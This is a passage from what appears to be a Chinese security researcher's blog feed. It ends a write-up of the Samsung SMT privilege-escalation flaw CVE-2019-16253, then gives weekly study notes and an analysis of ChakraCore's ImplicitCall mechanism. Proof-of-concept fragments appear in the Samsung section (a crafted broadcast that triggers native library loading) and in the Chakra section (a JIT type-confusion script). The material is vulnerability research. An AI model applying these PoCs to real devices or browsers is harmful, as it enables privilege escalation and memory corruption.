        PackageInfo packageInfo;  // 获取当前应用对象package信息
        HashMap v3 = new HashMap();
        HashMap v4 = new HashMap();
        try {  // 获取所有安装的应用
            Iterator iterator = LangPackMgr.getContext(this.a).getPackageManager().getInstalledPackages(0x2000).iterator();  // 获取所有安装的应用
            while(true) {
            label_12:
                if(!iterator.hasNext()) {
                    goto label_56;
                }

                Object v0_1 = iterator.next();
                packageInfo = (PackageInfo)v0_1;  // 获取当前应用对象package信息
                if((packageInfo.applicationInfo.flags &amp;amp; 1) == 1 || !packageInfo.packageName.startsWith(&quot;com.samsung.SMT.lang&quot;)) {
                    continue;
                }

                break;
            }
        }
        catch(Exception v0) {
            v0.printStackTrace();
        }

        try {  // 包名为：com.samsung.SMT.lang.xxx
            Intent intent = new Intent(packageInfo.packageName);  // 包名为：com.samsung.SMT.lang.xxx
            intent.setPackage(packageInfo.packageName);
            LangPackMgr.getContext(this.a).startService(intent);
            LangPackMgr.increaseTriggerCount(this.a);
            v3.put(packageInfo.packageName.replace(&quot;com.samsung.SMT.lang&quot;, &quot;smt&quot;), packageInfo.packageName);
            goto label_12;
        }
        catch(Exception v1) {
        }

        ...

        v0.printStackTrace();
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;关键代码，意味着我们的Poc需要有一个Service，以包名作为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;intent-filter&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Intent intent = new Intent(packageInfo.packageName);  // 包名为：com.samsung.SMT.lang.xxx
intent.setPackage(packageInfo.packageName);
LangPackMgr.context.startService(intent);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;接下来结合flanker_hqd的Exp来解析&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/flankerhqd/vendor-android-cves&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我们可以看到上面在监控到有以&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;com.samsung.SMT.lang&quot;&lt;/code&gt;为包名前缀的应用安装时，会启动安装应用一个Service，指定Action为包名，所以我们需要注册一个Service，Service的Action为包名&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;service
    android:name=&quot;.MyService&quot;
    android:enabled=&quot;true&quot;
    android:exported=&quot;true&quot;&amp;gt;
    &amp;lt;intent-filter&amp;gt;
        &amp;lt;action android:name=&quot;com.samsung.SMT.lang.poc&quot; /&amp;gt;
    &amp;lt;/intent-filter&amp;gt;
&amp;lt;/service&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在我们的Service里，可以执行发送Intent的操作，这个Intent就会被广播接收器&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LangPackMgr$2&lt;/code&gt;接收到，进而调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System.load()&lt;/code&gt;，最后完成提权操作&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Thread thread = new Thread(new Runnable() {
    @Override
    public void run() {
        ...
        Intent bi = new Intent();
        bi.setAction(&quot;com.samsung.SMT.ACTION_INSTALL_FINISHED&quot;);
        ArrayList&amp;lt;CharSequence&amp;gt; s = new ArrayList&amp;lt;&amp;gt;();
        bi.putCharSequenceArrayListExtra(&quot;BROADCAST_CURRENT_LANGUAGE_INFO&quot;, s);
        bi.putExtra(&quot;BROADCAST_CURRENT_LANGUAGE_VERSION&quot;, &quot;99999&quot;);
        bi.putCharSequenceArrayListExtra(&quot;BROADCAST_DB_FILELIST&quot;, s);
        bi.putExtra(&quot;SMT_ENGINE_VERSION&quot;, 0x2590cd5b);//installed version is 361811291
        bi.putExtra(&quot;SMT_ENGINE_PATH&quot;, input);
        sendBroadcast(bi);
    }
});
thread.start();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://paper.seebug.org/1070/&quot;&gt;只是想学习外语，却被拿了system shell？&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.flanker017.me/text-to-speech-speaks-pwned/&quot;&gt;Text-To-Speech speaks pwned&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <pubDate>Fri, 27 Dec 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_application_security/2019/12/27/CVE-2019-16253-SamsungSMT%E5%AF%BC%E5%87%BA%E7%BB%84%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_application_security/2019/12/27/CVE-2019-16253-SamsungSMT%E5%AF%BC%E5%87%BA%E7%BB%84%E4%BB%B6%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2019.12.20</title>
                <description>&lt;p&gt;Frida是个好东西，我觉得还挺好用的&lt;/p&gt;

&lt;p&gt;上周用小米MIX2刷测试机，官方线刷救砖包，Android 9，Magisk，EdXposed，挺费劲儿的，写钩子调试感觉也不是很稳定，效果没有在我之前的4.4和6上面调试的感觉好&lt;/p&gt;

&lt;p&gt;最近一直都在划水，也没看什么技术文章，年底怠惰了&lt;/p&gt;

&lt;p&gt;科恩这篇文章对我来说难度有点太大了，虽然这个领域很有意思，但是想看懂还需要找个大佬给仔细讲讲，于是我去找了一个大佬学习了一波，emmmmmmmmm，想靠大佬讲讲就能弄懂还是不现实，好在大佬给讲了个大概，我先摸索看看，我觉得研究二进制函数相似性有很多可以玩的&lt;/p&gt;

&lt;p&gt;科恩 - AAAI-20论文解读：基于图神经网络的二进制代码分析&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/mTynxUBNBeiYcAhx4PNJrA&lt;/li&gt;
  &lt;li&gt;https://keenlab.tencent.com/en/whitepapers/Ordermatters.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;逻辑漏洞是我接下来想要花精力研究的一个方向，也相当考验自己对整个功能模块的整体掌握，这篇文章讲的是利用Firefox的逻辑漏洞CVE-2019-9812来逃逸沙箱，作者称它是2019 Pwn2Own上Firefox沙箱逃逸漏洞CVE-2019-9811的变体&lt;/p&gt;

&lt;p&gt;CVE-2019-9812 - SYNCING OUT OF THE FIREFOX SANDBOX&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.zerodayinitiative.com/blog/2019/12/15/syncing-out-of-the-firefox-sandbox&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;2019 BotConf公开了部分slides，有的议题可以学习下思路&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.botconf.eu/botconf-2019/schedule/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;因为我以前做过Android APT相关的防御，所以看了几个感兴趣的，质量的话我觉得还行吧&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/fkie-cad/DeStroid/blob/master/DeStroid_bonus_slides.pdf&lt;/li&gt;
  &lt;li&gt;https://maxkersten.nl/wp-content/uploads/2019/12/StaticAndroidMalwareAnalysisWorkshop-Botconf2019.pdf&lt;/li&gt;
  &lt;li&gt;botconf.eu/wp-content/uploads/2019/12/B2019-Bilstein-Plohmann-YaraSignator.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;尤其是《DeStroid - Fighting String Encryption in Android Malware》，看的我也想去投几个会议刷刷脸，得排排计划了&lt;/p&gt;

&lt;p&gt;这三篇slides我会找时间写一写对应的解读文章，对安卓自动化的病毒检测分析相关技术感兴趣的同学可以期待一下，这是我的专业领域，不会跳票&lt;/p&gt;

&lt;p&gt;真的已经在写了:))&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3B69FDBDEC6CFC548BEBCDA44BC78EFE.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2019 BlackHat关于4G攻击场景的slides，对于我一个外行来说学习下还不错，虽然有一些名词没见过，但是搜一搜，多看看相关的文章也就可以弄懂了，突然感觉对于专业的二进制选手来说逆向嵌入式设备也不难，找篇文章讲讲嵌入式设备领域安全的现状，举一两个芯片固件攻击面以及利用的例子就差不多可以开始玩，似乎又回到了传统二进制攻防领域&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://i.blackhat.com/USA-19/Wednesday/us-19-Shupeng-All-The-4G-Modules-Could-Be-Hacked.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;还有一个5G攻击，我本科学的是硬件专业，看到这些芯片设备，提到的技术名词还是比较熟悉的，算是有一定的基础，所以看起来没那么费劲&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://i.blackhat.com/USA-19/Wednesday/us-19-Shaik-New-Vulnerabilities-In-5G-Networks.pdf&lt;/li&gt;
  &lt;li&gt;https://i.blackhat.com/USA-19/Wednesday/us-19-Shaik-New-Vulnerabilities-In-5G-Networks-wp.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;关于修改数据包来攻击IM应用的思路我之前想过一些，其实想去测试这部分处理逻辑的方式还是挺多的，因为最后还是要组包发出去，那么一个个数据在进行加密组包前的明文可以有机会进行修改，这个很容易做到，我相信这部分是一个很好的产出点，作者用的是解密数据包的方式&lt;/p&gt;

&lt;p&gt;BreakingApp – WhatsApp Crash &amp;amp; Data Loss Bug&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://research.checkpoint.com/2019/breakingapp-whatsapp-crash-data-loss-bug/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其中关于解密WhatsApp消息的这部分在今年的BlackHat上有一个相关的议题，讲的也是比较详细的，我顺带看了一下视频，这哥们说话的时候总感觉发音咕噜咕噜的&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://i.blackhat.com/USA-19/Wednesday/us-19-Zaikin-Reverse-Engineering-WhatsApp-Encryption-For-Chat-Manipulation-And-More.pdf&lt;/li&gt;
  &lt;li&gt;https://www.youtube.com/watch?v=N0Ne623fKWc&amp;amp;list=PLH15HpR5qRsWrfkjwFSI256x1u2Zy49VI&amp;amp;index=65&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;是时候再次贴出这张神图了，WhatsApp的Zero Click RCE&amp;amp;LPE值1500000$，妈耶！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3418C5CE377DB8CA9612D9B967C42DE8.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;学习了编译原理里面的block相关的概念，这些原来完全不懂的概念现在一点一点的清晰，是件好事&lt;/p&gt;

&lt;p&gt;编译原理相关的知识点我知道大佬们都会，这里就简单的贴几张PPT&lt;/p&gt;

&lt;p&gt;流图的基本规则&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/DC3AA7643E8345D8BE72D25BAADE7911.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;一段循环的代码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/AD90521F7D62DD4D755A4167F7B9E0B4.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;layout: post
title:  “大土豆安全笔记 2019.04.15 - 2019.04.19”
date:   2019-04-19 18:00:00 +520
categories: Security_Daily
—&lt;/p&gt;

&lt;p&gt;通过规则绘制的流图如下，那么每个块就是一个Block&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/85A4766EF8A4C4CAED77DE1B5ABB437D.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;后面还有一些优化的理论介绍，感觉挺好&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/72DFBEA8EB00E8A724BA31CE55015D44.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;常用的优化方法&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A89FEF9F4C51C3A34FA44CB320AD6B6C.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;CVE-2019-13686 - Issue 1000002: Security: OfflinePageAutoFetcher UAF 2，目前还没看懂，可以用于沙箱逃逸，给了20000$&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=1000002&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最后关注了一下安全领域的一些学术会议，加入学习的计划中，李神探给讲了讲一些靠谱的会议，我打算先找最近三年的Paper读一读，之前也读过一些，虽然读的仔细但是并没有系统的进行学习，想先统计某个我感兴趣领域的Paper，了解下学术界对这个领域都研究到什么程度，工业界我还是比较熟悉的，每年的BlackHat很能体现了&lt;/p&gt;

&lt;p&gt;2019 USENIX Security，挑了一些Paper学习下&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.usenix.org/conference/usenixsecurity19/technical-sessions&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我就是想法太多，然而不会写代码实现想法，哇啦哇啦又讲了一堆，马上要圣诞节咯！！！:))&lt;/p&gt;
</description>
                <pubDate>Fri, 20 Dec 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2019/12/20/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2019.12.20.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2019/12/20/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2019.12.20.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2019.12.13</title>
                <description>&lt;p&gt;这几天我一直在看大佬们的分析文章，在读到一篇文章的时候，我想通了一些事情，不掌握一个引擎的设计和基本思想，又如何融汇贯通呢？以OpCode为单位进行优化，以Block为单位进行优化，以Function为单位进行优化，不掌握编译器的基本思想，直接读源码去学习引擎怕是事倍功半，连这些概念都听不到&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/30BA7D7D696600B833CA3AE52F0E9C0C.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我之前搞脱壳，一开始啥都不懂，跟着别人的分析文章调试，别人给个样本，告诉我在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dvmDexFileOpenPartial&lt;/code&gt;函数下断点，一代壳轻松脱掉，有的壳弱一点，二代壳也可以脱掉，但是如果壳升级了呢？从一开始的解密Dex文件进行动态加载变成了类抽取，函数抽取呢？这时候需要什么能力才能自己研究出新的脱壳方法？&lt;/p&gt;

&lt;p&gt;不懂脱壳的还是只会在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dvmDexFileOpenPartial&lt;/code&gt;函数下断点，脱出来的必然是空Dex，因为函数指令没有恢复，肯定是脱不出来的，后来我系统的分析了APP的安装过程源码，如何加载Dex，Dalvik和ART如何执行Method，整套源码其实不多，所以可以直接上手阅读，在读完之后，我就对虚拟机执行Opcode的整个流程有了一个清晰的认识，我也知道为什么要在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dvmDexFileOpenPartial&lt;/code&gt;函数下断点，以及还有哪里可以下断点&lt;/p&gt;

&lt;p&gt;回到刚才说过的一个问题，如果从单纯的Dex加载变成类抽取，函数抽取该如何脱壳？&lt;/p&gt;

&lt;p&gt;在掌握了虚拟机执行流程之后，这个问题便轻松解决，因为加载Dex前我们进行一次主动加载，就可以拿到所有的真实数据，因为壳只是保护作用，当系统要加载这个类里的某个方法或者函数，必然是要主动恢复真实指令的，那些提出脱壳点的大佬肯定都是把安卓虚拟机源码研究的滚瓜烂熟才能找到脱壳的方法，尤其是后期的指令替换等加固方式，需要在一个整体的角度进行思考，而不是单纯的下个断点就可以解决的，这里就不过多深入讨论了&lt;/p&gt;

&lt;p&gt;所以我觉得我现在就处于盲目跟着别人学习漏洞分析的情况，我不知道为什么要定位到大佬说的函数，不知道如何进入这个函数，哪个阶段进来的，JIT优化的入口在哪里，我知道JIT优化要先生成IR，但是它是如何生成的呢？数据流分析是什么？在哪里实现？大佬们文章里提到的kill机制是什么？为什么要有kill机制，这个机制都用在了哪里？&lt;/p&gt;

&lt;p&gt;以上这一连串的问题就是我最近学习浏览器时候思考的，当然还有更多的问题没有写出来，其实这些问题有很多在我掌握了编译原理，掌握一个引擎的设计之后就很轻松解决了&lt;/p&gt;

&lt;p&gt;下面这些在之前一篇安全周报里提过一次，但是后来因为学习漏洞逐渐就跑偏了，现在再回过头来想想，确实如此&lt;/p&gt;

&lt;p&gt;RednaxelaFX写的文章/回答的导航帖&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://zhuanlan.zhihu.com/p/25042028&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;新手上路学习JavaScript引擎实现——路线图&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://zhuanlan.zhihu.com/p/20505562&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;各JavaScript引擎的简介，及相关资料/博客收集帖&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://hllvm-group.iteye.com/group/topic/37596&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;学习编程语言与编译优化的一个书单&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://zhuanlan.zhihu.com/p/20130808&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;有哪些常用 JIT 算法？&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.zhihu.com/question/54748092/answer/141903877&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以上说的都是我个人想法，不接受任何反驳，你拿了千万Bounty也好，你是谷歌名人堂也罢，大家的目的不一样，对我而言，我要对JS引擎实现有一个整体的认识，把知识学的扎实最重要&lt;/p&gt;

&lt;p&gt;本周一些浏览器资料&lt;/p&gt;

&lt;p&gt;大佬开始搞WebKit了？&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Firefox CVE-2019-11708 &amp;amp; CVE-2019-9810 Exploit&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/0vercl0k/CVE-2019-11708&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;前几天盘古发了一篇文章，学习了一波&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s/UBZv0pd7Nr-o-NMxjV53RQ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我发现自己现在看东西都看的很仔细，可能是因为学习浏览器的后遗症，最早学习开发的时候，教程一大把，看啥都很快的看过去了，有些不懂的知识点跳过也就忘了，后来学习浏览器的时候，发现资料真的少，就只能一个词一个词的仔细看，我有时候跟大佬们聊天也是，我问大佬一个知识点或者一个漏洞，大佬给我哇啦哇啦讲一堆，然后我就把大佬给我讲的仔细的记录下来，尽可能的学习透彻，虽然笨但是感觉还是学到了很多东西的&lt;/p&gt;

&lt;p&gt;比如这篇文章里的第二段，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASLR&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DEP/W^X&lt;/code&gt;我之前学习过，也掌握的还行，所以没有太多关注，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROP/JOP/Data-only attack&lt;/code&gt;我只知道&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROP&lt;/code&gt;，后面提到的论文我也没看过，既然有这么一篇论文，其它同类型的研究论文也应该找出来仔细读读，再后面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;控制流完整性技术&lt;/code&gt;等等，我发现我现在真的是珍惜这种大佬们的经验分享，能学到特别多的东西&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2000年代后期，地址空间随机化(ASLR)和数据执行保护(DEP/W^X)成为两项通用的基础性漏洞利用缓解机制。不幸的是，利用漏洞实现内存信息泄漏绕过ASLR进而基于ROP/JOP/Data-only attack等攻击技巧实现任意代码执行成为攻击者的标配 (更多内存漏洞攻防技术信息，参考《SoK: Eternal War in Memory》，https://people.eecs.berkeley.edu/~dawnsong/papers/Oakland13-SoK-CR.pdf）。面对大量绕过ASLR和(DEP/W^X)的漏洞利用样本，学术界再次掀起了针对细颗粒度ASLR和Anti-ROP的研究高潮。最终，在诸多潜在技术解决方案中，（粗颗粒度的）控制流完整性技术赢得了市场 (不同CFI机制实现细节和对比，参考 《Control-Flow Integrity: Precision, Security, and Performance》https://nebelwelt.net/publications/files/17CSUR.pdf)。为此，英特尔芯片中新增了CET特性（Control-flow Enforcement Technology），支持粗颗粒度前向跳转地址验证和基于Shadow Stack Register的返回地址验证，ARM V8.3标准中增加了PAC（Pointer Authentication Code）特性，支持对数据或者代码指针完整性的验证；LLVM、GCC、VisualStudio等主流编译器中支持开启CFI特性的编译选项；Windows、Android、iOS等操作系统都已经在用户态和内核态实现不同粒度的CFI机制。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最近感觉状态不太好，年底想稍微休息下，看点简单的东西，就先不学习浏览器相关的漏洞了&lt;/p&gt;

&lt;p&gt;打算回归下老本行，看看Frida的一些好玩的利用，看看大佬们写的逆向文章，再看看编译原理的优化部分，到元旦之后再开始计划下2020年想做的事情&lt;/p&gt;
</description>
                <pubDate>Fri, 13 Dec 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2019/12/13/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2019.12.13.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2019/12/13/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2019.12.13.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.12.02 - 2019.12.06</title>
                <description>&lt;p&gt;上周五笔记本送修，水果店告诉我没有配件现货，订货加维修可能要一周时间，还以为这周的安全周报没法写了，结果周日就告诉我维修完成可以去拿，这售后可以啊！&lt;/p&gt;

&lt;p&gt;这周主要是看ChakraCore的一些内部机制，比如回调相关的ImplicitCall机制&lt;/p&gt;

&lt;p&gt;主要是学习的elli0tn0phack师傅的文章《Chakra漏洞调试笔记1——ImplicitCall》，这一系列文章我学到了很多，当然目前只是读了几遍，其中很多的知识点我都还在一点一点的学习，这周主要把ImplicitCall机制给学习清楚了，这里也感谢elli0tn0phack师傅和Sakura师傅耐心的指导，感谢师傅们！&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.anquanke.com/post/id/180551&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;elli0tn0phack师傅在今年的BlueHat Shanghai也有关于浏览器安全相关的精彩演讲《Browser Script Engine Zero Days in 2018》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://images.seebug.org/archive/Browser_Script_Engine_Zero_Days_in_2018-EN.pdf&lt;/li&gt;
  &lt;li&gt;https://www.microsoft.com/en-us/videoplayer/embed/RE39Zq1&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个会议的官网上有本次会议的大部分视频以及所有的Slides&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.microsoft.com/china/bluehatshanghai/2019/#Agenda&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;关于ImplicitCall机制，它是用于防止执行回调修改了JS对象，但是JIT不知道的情况，比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;valueOf&lt;/code&gt;回调里修改了数组的长度，但是JIT循环的时候还是缓存的长度，那就会造成一个越界访问&lt;/p&gt;

&lt;p&gt;Poc&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function main() {
    let arr = [1.1, 1.1, 1.1, 1.1, 1.1];
    function opt(f) {
        arr[0] = 1.1;
        arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
        arr[2] = 1.1;
        arr[3] = 1.1;
    }

    let r0 = () =&amp;gt; '0';
    for (var i = 0; i &amp;lt; 0x1000; i++)
        opt(r0);

    opt(() =&amp;gt; {
        arr[0] = {};
        return '0';
    });

    print(arr[1]);
}

main();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个漏洞的成因是因为在JITed Code里触发回调修改了数组&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arr&lt;/code&gt;的类型，但是JIT Compiler没有意识到这一点，导致JS层数组修改了类型，但是引擎还把数组当作浮点数数组进行赋值操作&lt;/p&gt;

&lt;p&gt;正常情况下JIT Compiler是考虑了回调改变对象内存布局这种情况的，具体实现由&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Js::Var ExecuteImplicitCall&lt;/code&gt;来完成&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;template &amp;lt;class Fn&amp;gt;
inline Js::Var ExecuteImplicitCall(Js::RecyclableObject * function, Js::ImplicitCallFlags flags, Fn implicitCall)
{
    // For now, we will not allow Function that is marked as HasNoSideEffect to be called, and we will just bailout.
    // These function may still throw exceptions, so we will need to add checks with RecordImplicitException
    // so that we don't throw exception when disableImplicitCall is set before we allow these function to be called
    // as an optimization.  (These functions are valueOf and toString calls for built-in non primitive types)

    Js::FunctionInfo::Attributes attributes = Js::FunctionInfo::GetAttributes(function);

    // we can hoist out const method if we know the function doesn't have side effect,
    // and the value can be hoisted.
    // 没有Side Effect的函数可以直接调用
    if (this-&amp;gt;HasNoSideEffect(function, attributes))
    {
        // Has no side effect means the function does not change global value or
        // will check for implicit call flags
        return implicitCall();
    }

    // Don't call the implicit call if disable implicit call
    // 如果ImplicitCall被禁用表示不允许调用
    if (IsDisableImplicitCall())
    {
        AddImplicitCallFlags(flags);
        // Return &quot;undefined&quot; just so we have a valid var, in case subsequent instructions are executed
        // before we bail out.
        return function-&amp;gt;GetScriptContext()-&amp;gt;GetLibrary()-&amp;gt;GetUndefined();
    }

    if ((attributes &amp;amp; Js::FunctionInfo::HasNoSideEffect) != 0)
    {
        // Has no side effect means the function does not change global value or
        // will check for implicit call flags
        return implicitCall();
    }

    // Save and restore implicit flags around the implicit call

    // 此时明确有回调且有Side Effect，所以设置saveImplicitCallFlags的值
    Js::ImplicitCallFlags saveImplicitCallFlags = this-&amp;gt;GetImplicitCallFlags();
    Js::Var result = implicitCall();
    this-&amp;gt;SetImplicitCallFlags((Js::ImplicitCallFlags)(saveImplicitCallFlags | flags));
    return result;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RegexHelper::StringReplace&lt;/code&gt;实现的地方，可以看到直接调用用户定义的函数，没有做检查&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Var RegexHelper::StringReplace(JavascriptString* match, JavascriptString* input, JavascriptFunction* replacefn)
{
    CharCount indexMatched = JavascriptString::strstr(input, match, true);
    ScriptContext* scriptContext = replacefn-&amp;gt;GetScriptContext();
    Assert(match-&amp;gt;GetScriptContext() == scriptContext);
    Assert(input-&amp;gt;GetScriptContext() == scriptContext);

    if (indexMatched != CharCountFlag)
    {
        Var pThis = scriptContext-&amp;gt;GetLibrary()-&amp;gt;GetUndefined();
        // 调用用户定义的函数
        Var replaceVar = CALL_FUNCTION(scriptContext-&amp;gt;GetThreadContext(), replacefn, CallInfo(4), pThis, match, JavascriptNumber::ToVar((int)indexMatched, scriptContext), input);  // &amp;lt;--
        JavascriptString* replace = JavascriptConversion::ToString(replaceVar, scriptContext);
        const char16* inputStr = input-&amp;gt;GetString();
        const char16* prefixStr = inputStr;
        CharCount prefixLength = indexMatched;
        const char16* postfixStr = inputStr + prefixLength + match-&amp;gt;GetLength();
        CharCount postfixLength = input-&amp;gt;GetLength() - prefixLength - match-&amp;gt;GetLength();
        CharCount newLength = prefixLength + postfixLength + replace-&amp;gt;GetLength();
        BufferStringBuilder bufferString(newLength, match-&amp;gt;GetScriptContext());
        bufferString.SetContent(prefixStr, prefixLength,
                                replace-&amp;gt;GetString(), replace-&amp;gt;GetLength(),
                                postfixStr, postfixLength);
        return bufferString.ToString();
